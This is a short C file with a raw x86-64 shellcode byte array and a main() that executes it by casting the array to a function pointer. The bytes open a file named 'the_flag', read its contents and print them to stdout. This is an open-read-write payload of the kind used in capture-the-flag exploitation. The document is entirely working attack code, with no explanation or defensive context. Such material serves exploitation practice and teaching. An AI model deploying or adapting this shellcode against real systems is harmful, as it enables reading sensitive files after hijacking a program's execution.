unsigned char code[] = {
  0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x74, 0x68, 0x65, 0x5f, 0x66, 0x6c,
  0x61, 0x67, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2,
  0xb0, 0x02, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0x48, 0x31, 0xc0, 0x48, 0x83,
  0xec, 0x50, 0x54, 0x5e, 0xb2, 0x50, 0x0f, 0x05, 0x48, 0x89, 0xc2, 0xb0,
  0x01, 0x40, 0xb7, 0x01, 0x0f, 0x05, 0xb0, 0x3c, 0x0f, 0x05
};

int main(int argc, char **argv)
{
	int (*func)();
	func = (int (*)()) code;
	(int)(*func)();
	return 0;
}
